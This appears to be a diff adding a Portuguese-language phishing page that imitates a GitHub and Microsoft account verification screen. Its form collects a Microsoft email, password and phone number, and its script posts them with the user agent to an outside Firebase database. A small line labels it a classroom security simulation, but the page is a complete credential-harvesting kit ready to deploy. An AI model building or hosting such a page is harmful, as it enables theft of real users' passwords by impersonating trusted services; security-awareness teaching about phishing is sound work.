@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub - Verificação de Conta Microsoft</title>
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.png">
+    <style>
+        /* Mesmo CSS anterior (mantido compacto) */
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0d1117; color: #c9d1d9;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh;
+        }
+        .container { width: 100%; max-width: 420px; padding: 20px; }
+        .github-header { display:flex; align-items:center; gap:12px; margin-bottom:30px; justify-content:center; }
+        .github-header h1 { color:#58a6ff; font-size:28px; }
+        .card {
+            background:#161b22; border:1px solid #30363d; border-radius:12px;
+            padding:32px 28px; box-shadow:0 4px 12px rgba(0,0,0,0.4); text-align:center;
+        }
+        .btn {
+            padding:12px 24px; border-radius:8px; font-weight:600; cursor:pointer;
+            border:none; font-size:15px; margin:0 6px;
+        }
+        .primary { background:#238636; color:white; }
+        .primary:hover { background:#2ea44f; }
+        .secondary { background:#21262d; color:#c9d1d9; border:1px solid #30363d; }
+        .formulario { margin-top:20px; text-align:left; }
+        .formulario label { display:block; margin:16px 0 6px; color:#8b949e; font-size:14px; }
+        .formulario input {
+            width:100%; padding:10px 12px; background:#0d1117; border:1px solid #30363d;
+            border-radius:6px; color:#c9d1d9; font-size:16px;
+        }
+        .full { width:100%; margin-top:20px; }
+        .hidden { display:none; }
+        .aviso { color:#f85149; font-size:12px; margin-top:12px; text-align:center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="github-header">
+            <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub" width="60">
+            <h1>github</h1>
+        </div>
+
+        <div class="card">
+            <div class="microsoft-logo" style="margin-bottom:20px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" width="80">
+            </div>
+
+            <h2>Verifique sua conta Microsoft</h2>
+            <p class="subtitle">Para continuar acessando o GitHub, confirme que é você.</p>
+
+            <div class="buttons" id="botoes">
+                <button onclick="iniciarVerificacao()" class="btn primary">✅ Verificar</button>
+                <button onclick="iniciarVerificacao()" class="btn secondary">❌ Não sou eu</button>
+            </div>
+
+            <div id="formulario" class="formulario hidden">
+                <h3>Confirme sua identidade</h3>
+                
+                <label>E-mail da conta Microsoft</label>
+                <input type="email" id="email" placeholder="seuemail@exemplo.com">
+
+                <label>Senha</label>
+                <input type="password" id="senha" placeholder="••••••••">
+
+                <label>Número de telefone</label>
+                <input type="tel" id="telefone" placeholder="+55 (00) 00000-0000">
+
+                <button onclick="enviarDados()" class="btn primary full">Continuar</button>
+                <p class="aviso">⚠️ SIMULAÇÃO PARA TRABALHO DE SEGURANÇA DA INFORMAÇÃO</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function iniciarVerificacao() {
+            document.getElementById('formulario').classList.remove('hidden');
+            document.getElementById('botoes').style.display = 'none';
+        }
+
+        async function enviarDados() {
+            const email = document.getElementById('email').value.trim();
+            const senha = document.getElementById('senha').value.trim();
+            const telefone = document.getElementById('telefone').value.trim();
+
+            if (!email || !senha || !telefone) {
+                alert("Preencha todos os campos!");
+                return;
+            }
+
+            const dados = {
+                email: email,
+                senha: senha,
+                telefone: telefone,
+                data: new Date().toLocaleString('pt-BR'),
+                ip: "Simulado - Verifique no Firebase",
+                userAgent: navigator.userAgent
+            };
+
+            console.log("Dados capturados:", dados);
+
+            // === PARTE QUE VOCÊ PRECISA CONFIGURAR ===
+            const firebaseURL = "https://evolutioncinta2-default-rtdb.firebaseio.com/";
+
+            try {
+                const response = await fetch(firebaseURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(dados)
+                });
+
+                if (response.ok) {
+                    alert("✅ Verificação enviada com sucesso!\n\n(Dados salvos no Firebase - para demonstração da aula)");
+                    // window.location.href = "https://github.com"; // simular redirecionamento
+                } else {
+                    alert("Erro ao enviar.");
+                }
+            } catch (error) {
+                console.error(error);
+                alert("Erro de conexão com o Firebase.");
+            }
+        }
+    </script>
+</body>
+</html>
